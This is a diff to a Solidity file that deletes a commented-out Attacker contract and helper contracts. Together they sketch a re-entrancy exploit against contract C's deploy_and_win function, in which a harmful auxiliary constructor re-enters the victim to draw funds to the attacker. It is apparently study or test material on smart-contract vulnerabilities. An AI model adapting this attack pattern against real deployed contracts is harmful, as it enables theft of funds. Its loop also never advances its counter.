@@ -29,38 +29,3 @@ contract C {
 		return addr;
     }
 }
-
-// contract Attacker {
-//     bytes private create_auxharmless_initcode;
-//     bytes private create_auxharmful_initcode;
-//     address private victim;
-//     // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
-//     constructor(bytes memory _create_auxharmless_initcode, bytes memory _create_auxharmful_initcode, address _victim) {    
-//         create_auxharmless_initcode = _create_auxharmless_initcode;
-//         create_auxharmful_initcode = _create_auxharmful_initcode;
-//         victim = _victim;
-//     }
-//     function attack() public {
-// 		C v = C(victim);
-//         uint i = 0;
-//         while (true) {
-//             if (i % 10 == 0)
-//                 // attack only every 10 instances, i.e. when some money is transfered
-//     	        v.deploy_and_win{value: 100}(create_auxharmful_initcode, payable(address(this)));
-//             else
-//                 v.deploy_and_win{value: 100}(create_auxharmless_initcode, payable(address(this)));
-//         }            
-//     }
-//     receive() external payable {}
-// }
-
-// contract AuxHarmless {
-//     constructor() {}
-// }
-
-// contract AuxHarmful {
-//     constructor(address payable attacker, bytes memory create_auxharmful_initcode) {
-// 		C(msg.sender).deploy_and_win(create_auxharmful_initcode, attacker);
-//     }
-// }
-
